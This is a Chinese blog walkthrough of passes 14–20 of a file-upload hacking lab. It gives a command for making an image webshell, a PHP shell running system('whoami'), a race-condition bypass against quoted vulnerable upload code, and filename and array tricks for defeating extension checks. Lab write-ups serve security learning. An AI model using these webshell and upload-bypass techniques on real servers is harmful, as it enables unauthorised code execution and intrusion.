+
+<p><img src="https://s2.ax1x.com/2019/03/20/AKbAzT.png" alt> </p>
+<h3 id="pass-14"><a href="#pass-14" class="headerlink" title="pass-14"></a>pass-14</h3><p>查看提示：</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本<span class="keyword">pass</span>使用getimagesize()检查是否为图片文件！</span><br></pre></td></tr></table></figure>
+
+<p>直接利用图片马直接就可以过，制作图片马的方法：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">将随意的一个图片和一个一句话木马结合在一起；</span><br><span class="line"><span class="number">1</span>.jpg</span><br><span class="line"><span class="number">1</span>.php</span><br><span class="line"></span><br><span class="line">在Windows的cmd中执行命令：copy <span class="number">1</span>.jpg/<span class="selector-tag">b</span> + <span class="number">1</span><span class="selector-class">.php</span> /<span class="selector-tag">a</span> shell.jpg</span><br></pre></td></tr></table></figure>
+
+<h3 id="pass-15"><a href="#pass-15" class="headerlink" title="pass-15"></a>pass-15</h3><p>用pass-14的方法就可以上传</p>
+<h3 id="pass-16"><a href="#pass-16" class="headerlink" title="pass-16"></a>pass-16</h3><p><a href="https://yang1k.github.io/2018/08/30/upload-pass16/#png%E6%96%87%E4%BB%B6%E7%BB%84%E6%88%90" target="_blank" rel="noopener">二次渲染详解</a> </p>
+<h3 id="pass-17"><a href="#pass-17" class="headerlink" title="pass-17"></a>pass-17</h3><p>提示需要代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = UPLOAD_PATH . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>流程是先把文件上传到服务器上，然后再判断是不是符合类型，如果不符合，那么用unlink函数删除该文件，如果符号，用rename函数修改文件名</p>
+<p>那么我们可以利用条件竞争来在unlink之前，访问shell</p>
+<p>shell.php</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">system(<span class="string">"whoami"</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span>d</span><br></pre></td></tr></table></figure>
+
+<h3 id="pass-18"><a href="#pass-18" class="headerlink" title="pass-18"></a>pass-18</h3><p>原理用pass-17</p>
+<h3 id="pass-19"><a href="#pass-19" class="headerlink" title="pass-19"></a>pass-19</h3><p>提示文件名可以控制，我们可以利用文件名加点来绕过检测</p>
+<h3 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h3><p>审计代码后发现，如果我们输入的是一个数组的话，那么就不会分割我们的文件名，而是直接操作这个数组，根据代码我们可以传入：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">$file</span>[0] = wxm.php</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$file</span>[2] = jpg</span></span><br></pre></td></tr></table></figure>
+
+<p>我们没有定义$file[1]，所以count($file)等于2，那么$file[count($file)-1]就为空，最后文件名就是$file[0]</p>
+<p><img src="https://s2.ax1x.com/2019/03/20/AKb4f0.png" alt> </p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://s2.ax1x.com/2019/03/20/AKqduF.png" alt> </p>
+
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href=“https://luobuming.github.io”>一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
